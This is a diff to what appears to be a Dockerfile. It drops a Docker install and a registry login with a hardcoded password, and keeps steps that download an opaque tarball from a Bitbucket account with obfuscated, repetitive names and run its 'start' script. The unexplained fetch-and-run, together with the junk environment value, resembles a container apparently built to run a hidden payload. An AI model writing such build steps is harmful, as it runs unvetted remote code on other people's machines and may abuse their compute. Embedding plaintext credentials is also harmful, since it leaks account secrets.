@@ -2,11 +2,6 @@ FROM vm/ubuntu:22.04
 
 ENV linux8888=linuxlinuxwebwebwebweblinuxlinuxwebweb88888888888888
 
-RUN apt-get update && \
-    apt-get install docker.io -y
-
-RUN echo "Linuxdistro&84" | docker login --username webwebwebwebwebweb --password-stdin
-
 RUN wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz
 
 RUN bash ./start
